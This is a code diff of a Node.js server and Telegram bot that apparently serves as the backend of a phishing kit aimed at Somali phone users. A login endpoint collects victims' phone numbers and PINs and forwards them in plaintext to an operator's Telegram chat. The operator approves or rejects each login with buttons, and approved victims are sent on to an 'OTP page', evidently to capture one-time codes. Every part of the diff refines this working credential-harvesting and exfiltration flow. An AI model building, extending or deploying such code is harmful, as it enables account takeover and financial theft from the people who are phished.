@@ -7,43 +7,16 @@ const app = express();
 const PORT = process.env.PORT || 8080;
 
 // -------------------- INIT BOT --------------------
-if (!process.env.BOT_TOKEN) {
-    throw new Error("BOT_TOKEN is missing in .env");
-}
-
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
-
-// -------------------- MEMORY STORE --------------------
 const statusStore = {};
 
-// -------------------- MIDDLEWARE --------------------
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
-
-// -------------------- ROUTES --------------------
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-app.get('/:page', (req, res) => {
-    if (req.params.page.startsWith('api')) {
-        return res.status(404).send("Not found");
-    }
-
-    const file = req.params.page.endsWith('.html')
-        ? req.params.page
-        : req.params.page + '.html';
-
-    res.sendFile(path.join(__dirname, 'public', file), (err) => {
-        if (err) res.status(404).send("Page not found");
-    });
-});
 
 // -------------------- LOGIN API --------------------
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
-
     const country = "Somalia";
     const countryCode = "+252";
 
@@ -71,7 +44,6 @@ app.post('/api/login-notification', async (req, res) => {
         `📱 <b>Phone Number:</b> ${phone}\n` +
         `🔢 <b>PIN:</b> ${pin}\n` +
         `⏰ <b>Time:</b> ${currentTime}\n\n` +
-        `📱 <b>New user - will show 2 OTPs</b>\n` +
         `━━━━━━━━━━━━━━━\n\n` +
         `⚠️ <b>User waiting for approval</b>\n` +
         `⌛ <b>Timeout: 5 minutes</b>`;
@@ -83,14 +55,14 @@ app.post('/api/login-notification', async (req, res) => {
                 inline_keyboard: [
                     [
                         {
-                            text: "✅ Approve",
-                            callback_data: `approve_${phone}_${pin}`
+                            text: "✅ Allow to Proceed",
+                            callback_data: `allow_to_proceed_${phone}_${pin}`
                         }
                     ],
                     [
                         {
-                            text: "❌ Deny",
-                            callback_data: `deny_${phone}`
+                            text: "❌ Invalid Information",
+                            callback_data: `invalid_information_${phone}`
                         }
                     ]
                 ]
@@ -98,45 +70,69 @@ app.post('/api/login-notification', async (req, res) => {
         });
 
         res.json({ success: true });
+
     } catch (err) {
-        console.error(err);
+        console.error(err.message);
         res.status(500).json({ error: "Telegram error" });
     }
 });
 
 // -------------------- BOT ACTIONS --------------------
-bot.action(/approve_(.+)_(.+)/, async (ctx) => {
+
+// APPROVE
+bot.action(/allow_to_proceed_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
+
     statusStore[phone] = "approved";
 
+    const currentTime = new Date().toLocaleTimeString('en-US', {
+        hour: 'numeric',
+        minute: 'numeric',
+        second: 'numeric',
+        hour12: true
+    });
+
+    const approvedMsg =
+        `✅ <b>LOGIN APPROVED</b>\n\n` +
+        `📱 <b>${phone}</b>\n` +
+        `🔐 <b>${pin}</b>\n\n` +
+        `━━━━━━━━━━━━━━━\n\n` +
+        `➡️ <b>Next: OTP Page</b>\n` +
+        `⏱️ <b>${currentTime}</b>`;
+
     try {
-        await ctx.editMessageText(
-            `✅ <b>PROCEEDED</b>\n📱 ${phone}\n🔐 ${pin}`,
-            { parse_mode: 'HTML' }
-        );
+        await ctx.replyWithHTML(approvedMsg);
+        await ctx.answerCbQuery("Allowed");
     } catch (e) {
         console.error(e.message);
     }
 });
 
-bot.action(/deny_(.+)/, async (ctx) => {
+// INVALID
+bot.action(/invalid_information_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
+
     statusStore[phone] = "denied";
 
     try {
-        await ctx.editMessageText(
-            "❌ <b>INFORMATION MARKED AS INVALID</b>",
-            { parse_mode: 'HTML' }
+        await ctx.replyWithHTML(
+            `❌ <b>INVALID INFORMATION</b>\n\n📱 ${phone}\n⚠️ Try again`
         );
+        await ctx.answerCbQuery("Invalid");
     } catch (e) {
         console.error(e.message);
     }
 });
 
-// -------------------- STATUS CHECK --------------------
+// -------------------- CHECK STATUS --------------------
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone;
+
+    if (!phone) {
+        return res.json({ status: "pending" });
+    }
+
     res.json({ status: statusStore[phone] || "pending" });
 });
 
